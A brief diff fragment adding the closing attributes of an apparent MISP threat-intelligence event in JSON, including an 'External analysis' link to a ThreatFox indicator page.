+        "comment": "GitHub Gist",
+        "timestamp": "1795046400"
+      },
+      {
+        "uuid": "89c53089-d1b7-5d4c-a3dd-75f471f8d851",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://threatfox.abuse.ch/ioc/2034982/",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "ThreatFox",
+        "timestamp": "1795046400"
+      }
+    ]
+  }
+}
